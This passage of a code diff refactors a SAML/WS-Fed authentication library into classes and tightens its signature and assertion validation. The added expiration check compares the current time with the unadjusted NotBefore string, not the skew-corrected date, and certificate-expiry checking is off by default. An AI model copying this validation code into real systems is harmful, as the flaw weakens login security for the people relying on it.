options.cert;\n+        return utils.certToPEM(base64cer);\n+      }\n+    }\n \n-  if (options.cert) {\n-    return callback();\n+    // If there's an embedded signature, but no thumbprints are supplied, use options.cert\n+    // either options.cert or options.thumbprints must be specified so at this point there\n+    // must be an options.cert\n+    return utils.certToPEM(options.cert);\n   }\n+}\n \n-  if (options.thumbprints) {\n+class SAML {\n+  constructor(options) {\n+    this.options = options || {};\n \n-    var valid_thumbprint = options.thumbprints.some(function (thumbprint) {\n-      return self.calculatedThumbprint.toUpperCase() === thumbprint.toUpperCase();\n-    });\n+    if (this.options.thumbprint) {\n+      this.options.thumbprints = (this.options.thumbprints || []).concat([this.options.thumbprint]);\n+    }\n \n-    if (!valid_thumbprint) {\n-      return callback(new Error('Invalid thumbprint (configured: ' + options.thumbprints.join(', ').toUpperCase() + '. calculated: ' + this.calculatedThumbprint.toUpperCase() + ')' ));\n+    if (!this.options.cert && (!this.options.thumbprints || this.options.thumbprints.length === 0)) {\n+      throw new Error('You should set either a base64 encoded certificate or the thumbprints of the signing certificates');\n     }\n \n-    return callback();\n+    this.options.checkExpiration = (typeof this.options.checkExpiration !== 'undefined') ? this.options.checkExpiration : true;\n+    // Note! It would be best to set this to true. But it's defaulting to false so as not to break login for expired certs.\n+    this.options.checkCertExpiration = (typeof this.options.checkCertExpiration !== 'undefined') ? this.options.checkCertExpiration : false;\n+    // clockskew in minutes\n+    this.options.clockSkew = (typeof this.options.clockSkew === 'number' && this.options.clockSkew >= 0) ? this.options.clockSkew : 3;\n+    this.options.checkAudience = (typeof this.options.checkAudience !== 'undefined') ? this.options.checkAudience : true;\n+    this.options.checkRecipient = (typeof this.options.checkRecipient !== 'undefined') ? this.options.checkRecipient : true;\n+    this.options.checkNameQualifier = (typeof this.options.checkNameQualifier !== 'undefined') ? this.options.checkNameQualifier : true;\n+    this.options.checkSPNameQualifier = (typeof this.options.checkSPNameQualifier !== 'undefined') ? this.options.checkSPNameQualifier : true;\n+    this.eventEmitter = this.options.eventEmitter || new EventEmitter();\n+    this.getUseTextContentDigestValue = options.getUseTextContentDigestValue;\n+\n+    this.parser = domParser;\n   }\n-};\n \n-SAML.prototype.extractAndValidateCertExpiration = function (validatedSamlAssertion, optionsCert) {\n-  // This accepts a validated SAML assertion and checks current time against the valid cert dates\n-  const certNodes = validatedSamlAssertion.getElementsByTagName(\"X509Certificate\");\n+  buildSignatureValidator (options) {\n+    const sig = new xmlCrypto.SignedXml({ idAttribute: 'AssertionID', getCertFromKeyInfo: getKeyFn(options) });\n+    return sig;\n+  }\n \n-  const cert = certNodes.length > 0 ? certNodes[0].textContent : optionsCert;\n+  validateSignature (str, options, callback) {\n+    const xml = utils.parseSamlResponse(str, this.parser);\n \n-  if (!cert) { return false; }\n+    const signaturePath = this.options.signaturePath || options.signaturePath;\n+    const signatures = xpath.select(signaturePath, xml);\n+    if (signatures.length === 0) {\n+      return callback(new Error('Signature is missing (xpath: ' + signaturePath + ')'));\n+    } else if (signatures.length > 1) {\n+      return callback(new Error('Signature was found more than one time (xpath: ' + signaturePath + ')'));\n+    }\n+    const signature = signatures[0];\n+\n+    let valid;\n+    const opts = Object.assign({}, options, { cert: this.options.cert, thumbprints: this.options.thumbprints });\n+    const sig = this.buildSignatureValidator(opts);\n+    try {\n+      sig.loadSignature(signature);\n+      valid = sig.checkSignature(utils.crlf2lf(str));\n+\n+      // TODO: this shouldn't be done until we have determined its completely valid, it should happen in `parseAssertion`\n+      if (!this.extractAndValidateCertExpiration(xml, this.options.cert) && this.options.checkCertExpiration) {\n+        return callback(new Error('The signing certificate is not currently valid.'), null);\n+      }\n+    } catch (e) {\n+      if (e.message === 'PEM_read_bio_PUBKEY failed') {\n+        return callback(new Error('The signing certificate is invalid (' + e.message + ')'));\n+      }\n+      if (e.opensslErrorStack !== undefined) {\n+        const err = new Error(`The signing certificate is invalid (${e.opensslErrorStack.join(', ')})`);\n+        err.originalError = e;\n \n-  const parsedCert = forge.pki.certificateFromPem(utils.certToPEM(cert));\n+        return callback(err);\n+      }\n \n-  const nowDate = new Date();\n+      return callback(e);\n+    }\n \n-  // true if current date is before expiry AND after cert start date\n-  if ( ! (nowDate > parsedCert.validity.notBefore && nowDate < parsedCert.validity.notAfter)) {\n-    this.eventEmitter.emit('certificateExpirationValidationFailed', {});\n-    return false;\n-  }\n+    if (!valid) {\n+      return callback(new Error('Signature check errors: ' + sig.references[0].validationError.message));\n+    }\n \n-  return true;\n-};\n+    if (!sig.getSignedReferences().length) {\n+      return callback(new Error('Could not validate Signature(s)'));\n+    }\n \n-SAML.prototype.validateExpiration = function (samlAssertion, version) {\n-  var self = this;\n-  var conditions = xpath.select(\".//*[local-name(.)='Conditions']\", samlAssertion);\n-  if (!conditions || conditions.length === 0) return true;\n+    return callback(null, sig.getSignedReferences()[0]);\n+  }\n \n-  var notBefore = new Date(conditions[0].getAttribute('NotBefore'));\n-  notBefore = notBefore.setMinutes(notBefore.getMinutes() - self.options.clockSkew);\n+  extractAndValidateCertExpiration (validatedSamlAssertion, optionsCert) {\n+    // This accepts a validated SAML assertion and checks current time against the valid cert dates\n+    const certNodes = validatedSamlAssertion.getElementsByTagNameNS('http://www.w3.org/2000/09/xmldsig#', 'X509Certificate');\n \n-  var notOnOrAfter = new Date(conditions[0].getAttribute('NotOnOrAfter'));\n-  notOnOrAfter = notOnOrAfter.setMinutes(notOnOrAfter.getMinutes() + self.options.clockSkew);\n-  var now = new Date();\n+    const cert = certNodes.length > 0 ? certNodes[0].textContent : optionsCert;\n \n-  if (now < notBefore || now > notOnOrAfter)\n-    return false;\n+    if (!cert) { return false; }\n \n-  return true;\n-};\n+    const parsedCert = forge.pki.certificateFromPem(utils.certToPEM(cert));\n \n-SAML.prototype.validateAudience = function (samlAssertion, realm, version) {\n-  var audience;\n-  if (version === '2.0') {\n-    audience = xpath.select(\".//*[local-name(.)='Conditions']/*[local-name(.)='AudienceRestriction']/*[local-name(.)='Audience']\", samlAssertion);\n-  } else {\n-    audience = xpath.select(\".//*[local-name(.)='Conditions']/*[local-name(.)='AudienceRestrictionCondition']/*[local-name(.)='Audience']\", samlAssertion);\n-  }\n+    const nowDate = new Date();\n \n-  if (!audience || audience.length === 0) return false;\n-  return utils.stringCompare(audience[0].textContent, realm);\n-};\n+    // true if current date is before expiry AND after cert start date\n+    if ( ! (nowDate > parsedCert.validity.notBefore && nowDate < parsedCert.validity.notAfter)) {\n+      this.eventEmitter.emit('certificateExpirationValidationFailed', {});\n+      return false;\n+    }\n \n-SAML.prototype.validateNameQualifier = function (samlAssertion, issuer) {\n-  var nameID = getNameID20(samlAssertion);\n-  // NameQualifier is optional. Only validate if exists\n-  if (!nameID || !nameID.Format || !nameID.NameQualifier) return true;\n+    return true;\n+  }\n \n-  if ([\n-    'urn:oasis:names:tc:SAML:2.0:nameid-format:persistent',\n-    'urn:oasis:names:tc:SAML:2.0:nameid-format:transient'\n-    ].indexOf(nameID.Format) == -1){\n-      // Ignore validation if the format is not persistent or transient\n+  validateExpiration (samlAssertion) {\n+    const conditions = xpath.select(\"//*[local-name(.)='Assertion'][1]/*[local-name(.)='Conditions']\", samlAssertion);\n+    if (!conditions || conditions.length === 0) {\n       return true;\n-  }\n+    }\n \n-  return nameID.NameQualifier === issuer\n-};\n+    const condition = conditions[0];\n+    const notBefore = condition.getAttribute('NotBefore');\n+    const notOnOrAfter = condition.getAttribute('NotOnOrAfter');\n \n-SAML.prototype.validateSPNameQualifier = function (samlAssertion, audience) {\n-  var nameID = getNameID20(samlAssertion);\n-  // SPNameQualifier is optional. Only validate if exists\n-  if (!nameID || !nameID.Format || !nameID.SPNameQualifier) return true;\n+    // no expiration defined.\n+    if (!notBefore && !notOnOrAfter) {\n+      return true\n+    }\n \n-  if ([\n-    'urn:oasis:names:tc:SAML:2.0:nameid-format:persistent',\n-    'urn:oasis:names:tc:SAML:2.0:nameid-format:transient'\n-    ].indexOf(nameID.Format) == -1){\n-      // Ignore validation if the format is not persistent or transient\n-      return true;\n-  }\n+    const now = new Date();\n \n-  return nameID.SPNameQualifier === audience\n-};\n+    if (notBefore) {\n+      const notBeforeDate = new Date(notBefore);\n+      notBeforeDate.setMinutes(notBeforeDate.getMinutes() - this.options.clockSkew);\n+      if (now < notBefore) {\n+        return false;\n+      }\n+    }\n+\n+    if (notOnOrAfter) {\n+      const notOnOrAfterDate = new Date(notOnOrAfter);\n+      notOnOrAfterDate.setMinutes(notOnOrAfterDate.getMinutes() + this.options.clockSkew);\n+      if (now > notOnOrAfterDate) {\n+        return false;\n+      }\n+    }\n \n-// https://www.oasis-open.org/committees/download.php/35711/sstc-saml-core-errata-2.0-wd-06-diff.pdf\n-// Page 19 of 91\n-// Recipient [Optional]\n-// A URI specifying the entity or location to which an attesting entity can present the assertion. For\n-// example, this attribute might indicate that the assertion must be delivered to a particular network\n-// endpoint in order to prevent an intermediary from redirecting it someplace else.\n-SAML.prototype.validateRecipient = function(samlAssertion, recipientUrl){\n-  var subjectConfirmationData = xpath.select(\".//*[local-name(.)='Subject']/*[local-name(.)='SubjectConfirmation']/*[local-name(.)='SubjectConfirmationData']\", samlAssertion);\n-\n-  // subjectConfirmationData is optional in the spec. Only validate if the assertion contains a recipient\n-  if (!subjectConfirmationData || subjectConfirmationData.length === 0){\n     return true;\n   }\n \n-  var recipient = subjectConfirmationData[0].getAttribute('Recipient');\n-\n-  var valid = !recipient || recipient === recipientUrl;\n+  validateAudience (samlAssertion, realm, version) {\n+    let audience;\n+    if (version === '2.0') {\n+      audience = xpath.select(\"//*[local-name(.)='Assertion'][1]/*[local-name(.)='Conditions']/*[local-name(.)='AudienceRestriction']/*[local-name(.)='Audience']\", samlAssertion);\n+    } else {\n+      audience = xpath.select(\"//*[local-name(.)='Assertion'][1]/*[local-name(.)='Conditions']/*[local-name(.)='AudienceRestrictionCondition']/*[local-name(.)='Audience']\", samlAssertion);\n+    }\n \n-  if (!valid){\n-    this.eventEmitter.emit('recipientValidationFailed', {\n-       configuredRecipient: recipientUrl,\n-       assertionRecipient: recipient\n-     });\n+    if (!audience || audience.length === 0) {return false;}\n+    return utils.stringCompare(audience[0].textContent, realm);\n   }\n \n-  return valid;\n-};\n+  validateNameQualifier (samlAssertion, issuer) {\n+    const nameID = getNameID20(samlAssertion);\n+    // NameQualifier is optional. Only validate if exists\n+    if (!nameID || !nameID.Format || !nameID.NameQualifier) {\n+      return true;\n+    }\n \n-SAML.prototype.parseAttributes = function (samlAssertion, version) {\n-  function getAttributes(samlAssertion) {\n-    var attributes = xpath.select(\".//*[local-name(.)='AttributeStatement']/*[local-name(.)='Attribute']\", samlAssertion);\n-    return attributes;\n-  }\n+    if ([\n+      'urn:oasis:names:tc:SAML:2.0:nameid-format:persistent',\n+      'urn:oasis:names:tc:SAML:2.0:nameid-format:transient'\n+    ].indexOf(nameID.Format) === -1){\n+      // Ignore validation if the format is not persistent or transient\n+      return true;\n+    }\n \n-  function getSessionIndex(samlAssertion) {\n-    var authnStatement = xpath.select(\".//*[local-name(.)='AuthnStatement']\", samlAssertion);\n-    var sessionIndex = authnStatement.length > 0 && authnStatement[0].attributes.length > 0 ?\n-                    authnStatement[0].getAttribute('SessionIndex') : undefined;\n-    return sessionIndex || undefined;\n+    return nameID.NameQualifier === issuer;\n   }\n \n-  function getNameID11(samlAssertion) {\n-    var nameId = xpath.select(\".//*[local-name(.)='AuthenticationStatement']/*[local-name(.)='Subject']/*[local-name(.)='NameIdentifier']\", samlAssertion);\n+  validateSPNameQualifier (samlAssertion, audience) {\n+    const nameID = getNameID20(samlAssertion);\n+    // SPNameQualifier is optional. Only validate if exists\n+    if (!nameID || !nameID.Format || !nameID.SPNameQualifier) {return true;}\n \n-    if (nameId.length === 0) {\n-      // only for backward compatibility with adfs\n-      nameId = xpath.select(\".//*[local-name(.)='AttributeStatement']/*[local-name(.)='Subject']/*[local-name(.)='NameIdentifier']\", samlAssertion);\n-      if (nameId.length === 0) return;\n+    if ([\n+      'urn:oasis:names:tc:SAML:2.0:nameid-format:persistent',\n+      'urn:oasis:names:tc:SAML:2.0:nameid-format:transient'\n+    ].indexOf(nameID.Format) === -1){\n+      // Ignore validation if the format is not persistent or transient\n+      return true;\n     }\n \n-    return nameId[0].textContent;\n+    return nameID.SPNameQualifier === audience;\n   }\n \n-  function getAttributeValues(attribute) {\n-    if (!attribute || attribute.childNodes.length === 0) return;\n-    var attributeValues = [];\n-    for (var i = 0; i<attribute.childNodes.length; i++) {\n-      if (attribute.childNodes[i].nodeType !== ELEMENT_NODE) continue;\n-      attributeValues.push(attribute.childNodes[i].textContent);\n+  // https://www.oasis-open.org/committees/download.php/35711/sstc-saml-core-errata-2.0-wd-06-diff.pdf\n+  // Page 19 of 91\n+  // Recipient [Optional]\n+  // A URI specifying the entity or location to which an attesting entity can present the assertion. For\n+  // example, this attribute might indicate that the assertion must be delivered to a particular network\n+  // endpoint in order to prevent an intermediary from redirecting it someplace else.\n+  validateRecipient (samlAssertion, recipientUrl){\n+    const subjectConfirmationData = xpath.select(\"//*[local-name(.)='Assertion'][1]/*[local-name(.)='Subject']/*[local-name(.)='SubjectConfirmation']/*[local-name(.)='SubjectConfirmationData']\", samlAssertion);\n+\n+    // subjectConfirmationData is optional in the spec. Only validate if the assertion contains a recipient\n+    if (!subjectConfirmationData || subjectConfirmationData.length === 0){\n+      return true;\n     }\n \n-    if (attributeValues.length === 1) return attributeValues[0];\n+    const recipient = subjectConfirmationData[0].getAttribute('Recipient');\n \n-    return attributeValues;\n-  }\n+    const valid = !recipient || recipient === recipientUrl;\n+\n+    if (!valid){\n+      this.eventEmitter.emit('recipientValidationFailed', {\n+        configuredRecipient: recipientUrl,\n+        assertionRecipient: recipient\n+      });\n+    }\n \n-  function getAuthContext20(samlAssertion) {\n-    var authnContext = xpath.select(\".//*[local-name(.)='AuthnStatement']/*[local-name(.)='AuthnContext']/*[local-name(.)='AuthnContextClassRef']\", samlAssertion);\n-    if (authnContext.length === 0) return;\n-    return authnContext[0].textContent;\n+    return valid;\n   }\n \n-  var profile = {};\n-  var nameId;\n-  var authContext;\n-  var attributes = getAttributes(samlAssertion);\n-  profile.sessionIndex = getSessionIndex(samlAssertion);\n-  if (version === '2.0') {\n-    for (var index in attributes) {\n-      var attribute = attributes[index];\n-      var value = getAttributeValues(attribute);\n-      profile[attribute.getAttribute('Name')] = value;\n-    }\n+  parseAttributes (samlAssertion, version) {\n+    const profile = {};\n+    const attributes = getAttributes(samlAssertion);\n+    profile.sessionIndex = getSessionIndex(samlAssertion);\n+    if (version === '2.0') {\n+      for (let index in attributes) {\n+        const attribute = attributes[index];\n+        profile[attribute.getAttribute('Name')] = getAttributeValues(attribute);\n+      }\n \n-    nameId = getNameID20(samlAssertion);\n+      const nameId = getNameID20(samlAssertion);\n \n-    if (nameId) {\n-      profile['http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier'] = nameId.value;\n-      if(Object.keys(nameId).length > 1) {\n-        profile['nameIdAttributes'] = nameId;\n+      if (nameId) {\n+        profile['http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier'] = nameId.value;\n+        if(Object.keys(nameId).length > 1) {\n+          profile['nameIdAttributes'] = nameId;\n+        }\n       }\n-    }\n \n-    authContext = getAuthContext20(samlAssertion);\n-    if (authContext) {\n-      profile['http://schemas.microsoft.com/ws/2008/06/identity/claims/authenticationmethod'] = authContext;\n-    }\n+      const authContext = getAuthContext20(samlAssertion);\n+      if (authContext) {\n+        profile['http://schemas.microsoft.com/ws/2008/06/identity/claims/authenticationmethod'] = authContext;\n+      }\n+    } else {\n+      if (attributes) {\n+        for (let index in attributes) {\n+          const attribute = attributes[index];\n+          profile[attribute.getAttribute('AttributeNamespace') + '/' + attribute.getAttribute('AttributeName')] = getAttributeValues(attribute);\n+        }\n+      }\n \n-  } else {\n-    if (attributes) {\n-      for (var index2 in attributes) {\n-        var attribute2 = attributes[index2];\n-        var value2 = getAttributeValues(attribute2);\n-        profile[attribute2.getAttribute('AttributeNamespace') + '/' + attribute2.getAttribute('AttributeName')] = value2;\n+      const nameId = getNameID11(samlAssertion);\n+      if (nameId) {\n+        profile['http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier'] = typeof nameId === 'string' ? nameId : nameId['#'];\n       }\n     }\n \n-    nameId = getNameID11(samlAssertion);\n-    if (nameId) {\n-      profile['http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier'] = typeof nameId === 'string' ? nameId : nameId['#'];\n-    }\n+    return profile;\n   }\n \n-  return profile;\n-};\n-\n-SAML.prototype.validateSamlAssertion = function (samlAssertion, callback) {\n-  var self = this;\n-\n-  samlAssertion = utils.parseSamlResponse(samlAssertion);\n-\n-  self.validateSignature(samlAssertion.toString(), {\n-    cert: self.options.cert,\n-    thumbprints: self.options.thumbprints,\n-    signaturePath: \"/*[local-name(.)='Assertion']/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\" }, function(err) {\n-    if (err) return callback(err);\n-\n-    self.parseAssertion(samlAssertion, callback);\n-  });\n-};\n+  validateSamlAssertion (samlAssertionStr, options, callback) {\n+    this.validateSignature(samlAssertionStr, {\n+      meta: options.meta,\n+      signaturePath: \"//*[local-name(.)='Assertion'][1]/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\" }, (err, signed) => {\n+      if (err) {return callback(err);}\n \n-SAML.prototype.parseAssertion = function(samlAssertion, callback) {\n-  var self = this;\n-  if (self.options.extractSAMLAssertion){\n-    samlAssertion = self.options.extractSAMLAssertion(samlAssertion);\n+      this.parseAssertion(signed, callback);\n+    });\n   }\n \n-  samlAssertion = utils.parseSamlResponse(samlAssertion);\n+  parseAssertion (samlAssertion, callback) {\n+    if (this.options.extractSAMLAssertion){\n+      samlAssertion = this.options.extractSAMLAssertion(samlAssertion);\n+    }\n \n-  if (!samlAssertion.getAttribute)\n-    samlAssertion = samlAssertion.documentElement;\n+    samlAssertion = utils.parseSamlAssertion(samlAssertion, this.parser);\n \n-  const version = utils.getSamlAssertionVersion(samlAssertion);\n-  if (!version){\n-    // Note that this assumes any version returned by getSamlAssertionVersion is supported.\n-    return callback(new Error('SAML Assertion version not supported, or not defined'), null);\n-  }\n+    if (!samlAssertion.getAttribute) {\n+      samlAssertion = samlAssertion.documentElement;\n+    }\n \n-  if (self.options.checkExpiration && !self.validateExpiration(samlAssertion, version)) {\n-    return callback(new Error('assertion has expired.'), null);\n-  }\n+    if (samlAssertion.localName !== 'Assertion') {\n+      return callback(new Error('saml response does not contain an Assertion element'));\n+    }\n \n-  if (self.options.checkAudience && !self.validateAudience(samlAssertion, self.options.realm, version)) {\n-    return callback(new Error('Audience is invalid. Configured: ' + self.options.realm), null);\n-  }\n+    const version = utils.getSamlAssertionVersion(samlAssertion);\n+    if (!version){\n+      // Note that this assumes any version returned by getSamlAssertionVersion is supported.\n+      return callback(new Error('SAML Assertion version not supported, or not defined'), null);\n+    }\n \n-  if (!self.validateRecipient(samlAssertion, self.options.recipientUrl)) {\n-    if (self.options.checkRecipient){\n-      return callback(new Error('Recipient is invalid. Configured: ' + self.options.recipientUrl), null);\n+    if (this.options.checkExpiration && !this.validateExpiration(samlAssertion, version)) {\n+      return callback(new Error('assertion has expired.'), null);\n     }\n-  }\n \n-  var profile = self.parseAttributes(samlAssertion, version);\n+    if (this.options.checkAudience && !this.validateAudience(samlAssertion, this.options.realm, version)) {\n+      return callback(new Error('Audience is invalid. Configured: ' + this.options.realm), null);\n+    }\n \n-  var issuer;\n-  if (version === '2.0') {\n-    var issuerNode = xpath.select(\".//*[local-name(.)='Issuer']\", samlAssertion);\n-    if (issuerNode.length > 0) issuer = issuerNode[0].textContent;\n-  } else {\n-    issuer = samlAssertion.getAttribute('Issuer');\n-  }\n+    if (!this.validateRecipient(samlAssertion, this.options.recipientUrl)) {\n+      if (this.options.checkRecipient){\n+        return callback(new Error('Recipient is invalid. Configured: ' + this.options.recipientUrl), null);\n+      }\n+    }\n \n+    const profile = this.parseAttributes(samlAssertion, version);\n \n-  this.eventEmitter.emit('parseAssertion', {\n+    let issuer;\n+    if (version === '2.0') {\n+      const issuerNode = xpath.select(\"//*[local-name(.)='Assertion'][1]/*[local-name(.)='Issuer']\", samlAssertion);\n+      if (issuerNode.length > 0) {\n+        issuer = issuerNode[0].textContent;\n+      }\n+    } else {\n+      issuer = samlAssertion.getAttribute('Issuer');\n+    }\n+\n+    this.eventEmitter.emit('parseAssertion', {\n       issuer: issuer,\n       version: version,\n     });\n \n-  profile.issuer = issuer;\n-\n-  // Validate the name qualifier in the NameID element if found with the audience\n-  if (self.options.checkNameQualifier && !self.validateNameQualifier(samlAssertion, issuer)){\n-    return callback(new Error('NameQualifier attribute in the NameID element does not match ' + issuer), null);\n-  }\n-\n-  // Validate the SP name qualifier in the NameID element if found with the issuer\n-  if (self.options.checkSPNameQualifier && !self.validateSPNameQualifier(samlAssertion, self.options.realm)){\n-    return callback(new Error('SPNameQualifier attribute in the NameID element does not match ' + self.options.realm), null);\n-  }\n-\n-  if (!profile.email && profile['http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress']) {\n-    profile.email = profile['http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress'];\n-  }\n+    profile.issuer = issuer;\n \n-  callback(null, profile);\n-};\n+    // Validate the name qualifier in the NameID element if found with the audience\n+    if (this.options.checkNameQualifier && !this.validateNameQualifier(samlAssertion, issuer)) {\n+      return callback(new Error('NameQualifier attribute in the NameID element does not match ' + issuer), null);\n+    }\n \n-function getNameID20(samlAssertion) {\n-  var nameId = xpath.select(\".//*[local-name(.)='Subject']/*[local-name(.)='NameID']\", samlAssertion);\n-  if (nameId.length === 0) return;\n-  var element = nameId[0];\n-  var result = {\n-    value: element.textContent,\n-  };\n+    // Validate the SP name qualifier in the NameID element if found with the issuer\n+    if (this.options.checkSPNameQualifier && !this.validateSPNameQualifier(samlAssertion, this.options.realm)){\n+      return callback(new Error('SPNameQualifier attribute in the NameID element does not match ' + this.options.realm), null);\n+    }\n \n-  ['NameQualifier',\n-    'SPNameQualifier',\n-    'Format',\n-    'SPProvidedID'].forEach(function(key) {\n-    var value = element.getAttribute(key);\n-    if (!value) return;\n-    result[key] = element.getAttribute(key);\n-  });\n+    if (!profile.email && profile['http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress']) {\n+      profile.email = profile['http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress'];\n+    }\n \n-  return result;\n+    return callback(null, profile);\n+  }\n }\n \n-exports.SAML = SAML;\n+exports.SAML = SAML;\n\\ No newline at end of file\n```\n\nFilename: lib/passport-wsfed-saml2/samlp.js:\n```\n@@ -1,101 +1,81 @@\n-var xpath       = require('xpath');\n-var qs          = require('querystring');\n-var zlib        = require('zlib');\n-var xtend       = require('xtend');\n-var url         = require('url');\n-var xmlenc      = require('xml-encryption');\n-var crypto      = require('crypto');\n-var querystring = require('querystring');\n-var SignedXml   = require('xml-crypto').SignedXml;\n-var templates   = require('./templates');\n-var EventEmitter = require('events');\n-var validUrl     = require('valid-url');\n-\n-var utils                     = require('./utils');\n-var AuthenticationFailedError = require('./errors/AuthenticationFailedError');\n-\n-var BINDINGS = {\n+const xpath       = require('xpath');\n+const qs          = require('querystring');\n+const zlib        = require('zlib');\n+const xtend       = require('xtend');\n+const url         = require('url');\n+const xmlenc      = require('xml-encryption');\n+const crypto      = require('crypto');\n+const querystring = require('querystring');\n+const xmlCrypto   = require('xml-crypto');\n+const templates   = require('./templates');\n+const EventEmitter = require('events');\n+const validUrl     = require('valid-url');\n+const xmldom = require('@xmldom/xmldom');\n+\n+const domParser = new xmldom.DOMParser();\n+const utils                     = require('./utils');\n+const AuthenticationFailedError = require('./errors/AuthenticationFailedError');\n+\n+const saml2Namespace = 'urn:oasis:names:tc:SAML:2.0:assertion';\n+\n+const BINDINGS = {\n   HTTP_POST:      'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST',\n   HTTP_REDIRECT:  'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect'\n };\n \n-var ErrorMessages = {\n+const ErrorMessages = {\n   'urn:oasis:names:tc:SAML:2.0:status:VersionMismatch': 'The SAML responder could not process the request because the version of the request message was incorrect.',\n   'urn:oasis:names:tc:SAML:2.0:status:Requester' : 'The request could not be performed due to an error on the part of the requester',\n   'urn:oasis:names:tc:SAML:2.0:status:Responder' : 'The request could not be performed due to an error on the part of the SAML responder or SAML authority',\n   'urn:oasis:names:tc:SAML:2.0:status:AuthnFailed' : 'The responding provider was unable to successfully authenticate the principal'\n };\n \n-function ignoreValidationFunction(samlResponseID, done){\n-  return done();\n-}\n-\n-var encodingMappings = {\n+const encodingMappings = {\n   'ISO-8859-1': 'binary',\n   'UTF-8': 'utf8'\n };\n \n-var Samlp = module.exports = function Samlp (options, saml) {\n-  this.options = options || {};\n-\n-  if (this.options.thumbprint) {\n-    this.options.thumbprints = (this.options.thumbprints || []).concat([this.options.thumbprint]);\n-  }\n-\n-  if (typeof options.deflate === 'undefined') {\n-    this.options.deflate = true;\n-  }\n-\n-  this.options.checkDestination = (typeof this.options.checkDestination !== 'undefined') ? this.options.checkDestination : true;\n-  this.options.checkResponseID = (typeof this.options.checkResponseID !== 'undefined') ? this.options.checkResponseID : true;\n-  this.options.checkInResponseTo = (typeof this.options.checkInResponseTo !== 'undefined') ? this.options.checkInResponseTo : true;\n-\n-  this.eventEmitter = this.options.eventEmitter || new EventEmitter();\n-  this._saml = saml;\n-\n-  this.isValidResponseID = this.options.isValidResponseID || ignoreValidationFunction;\n-  this.isValidInResponseTo = this.options.isValidInResponseTo || ignoreValidationFunction;\n-\n-  this.default_encoding = encodingMappings[this.options.default_encoding] ||  'utf8';\n-};\n+function ignoreValidationFunction(samlResponseID, done){\n+  return done();\n+}\n \n function getProp(obj, path) {\n   return path.split('.').reduce(function (prev, curr) {\n     return prev[curr];\n   }, obj);\n }\n \n-var supplant = function (tmpl, o) {\n+const supplant = function (tmpl, o) {\n   return tmpl.replace(/\\@\\@([^\\@]*)\\@\\@/g,\n-    function (a, b) {\n-      var r = getProp(o, b);\n-      return typeof r === 'string' || typeof r === 'number' ? r : a;\n-    }\n+      function (a, b) {\n+        const r = getProp(o, b);\n+        return typeof r === 'string' || typeof r === 'number' ? r : a;\n+      }\n   );\n };\n \n-var trimXml = function (xml) {\n+const trimXml = function (xml) {\n   return xml.replace(/\\r\\n/g, '')\n       .replace(/\\n/g,'')\n       .replace(/>(\\s*)</g, '><') //unindent\n       .trim();\n };\n \n-var removeHeaders = function  (cert) {\n-  var pem = /-----BEGIN (\\w*)-----([^-]*)-----END (\\w*)-----/g.exec(cert.toString());\n+const removeHeaders = function (cert) {\n+  const pem = /-----BEGIN (\\w*)-----([^-]*)-----END (\\w*)-----/g.exec(cert.toString());\n   if (pem && pem.length > 0) {\n     return pem[2].replace(/[\\n|\\r\\n]/g, '');\n   }\n   return null;\n };\n \n-var sign = function (content, key, algorithm) {\n-  var signer = crypto.createSign(algorithm.toUpperCase());\n+const sign = function (content, key, algorithm) {\n+  const signer = crypto.createSign(algorithm.toUpperCase());\n   signer.update(content, 'latin1');\n   return signer.sign(key, 'base64');\n };\n \n-var algorithms = {\n+const algorithms = {\n   signature: {\n     'rsa-sha256': 'http://www.w3.org/2001/04/xmldsig-more#rsa-sha256',\n     'rsa-sha1':  'http://www.w3.org/2000/09/xmldsig#rsa-sha1'\n\n@@ -113,10 +93,10 @@\nfunction collectAncestorNamespaces(node, nameSpaces = [], maxDeep = 5){\n \n   const parent = node.parentNode;\n \n-  if(parent.attributes && parent.attributes.length > 0){\n+  if (parent.attributes && parent.attributes.length > 0){\n     for(let i=0;i<parent.attributes.length;i++){\n       const attr = parent.attributes[i];\n-      if(attr && attr.nodeName && attr.nodeName.search(/^xmlns:/) !== -1){\n+      if (attr && attr.nodeName && attr.nodeName.search(/^xmlns:/) !== -1){\n         nameSpaces.push({key: attr.nodeName, value: attr.nodeValue});\n       }\n     }\n\n@@ -125,24 +105,55 @@\nfunction collectAncestorNamespaces(node, nameSpaces = [], maxDeep = 5){\n   return collectAncestorNamespaces(parent, nameSpaces, maxDeep - 1);\n }\n \n-Samlp.prototype = {\n-  getSamlRequestParams: function (opts, callback) {\n-    var options = xtend(opts || {}, this.options);\n+function generateInstant() {\n+  const date = new Date();\n+  return date.getUTCFullYear() + '-' + ('0' + (date.getUTCMonth()+1)).slice(-2) + '-' + ('0' + date.getUTCDate()).slice(-2) + 'T' + ('0' + date.getUTCHours()).slice(-2) + ':' + ('0' + date.getUTCMinutes()).slice(-2) + ':' + ('0' + date.getUTCSeconds()).slice(-2) + 'Z';\n+}\n \n-    var idpUrl = options.identityProviderUrl;\n+function stripQueryAndFragmentFromURL(url) {\n+  return url.split('#')[0].split('?')[0];\n+}\n+\n+class Samlp {\n+  constructor(options, saml) {\n+    this.options = options || {};\n+\n+    if (typeof options.deflate === 'undefined') {\n+      this.options.deflate = true;\n+    }\n+\n+    this.options.checkDestination = (typeof this.options.checkDestination !== 'undefined') ? this.options.checkDestination : true;\n+    this.options.checkResponseID = (typeof this.options.checkResponseID !== 'undefined') ? this.options.checkResponseID : true;\n+    this.options.checkInResponseTo = (typeof this.options.checkInResponseTo !== 'undefined') ? this.options.checkInResponseTo : true;\n+\n+    this.eventEmitter = this.options.eventEmitter || new EventEmitter();\n+    this._saml = saml;\n+\n+    this.isValidResponseID = this.options.isValidResponseID || ignoreValidationFunction;\n+    this.isValidInResponseTo = this.options.isValidInResponseTo || ignoreValidationFunction;\n+\n+    this.defaultEncoding = encodingMappings[this.options.default_encoding] || 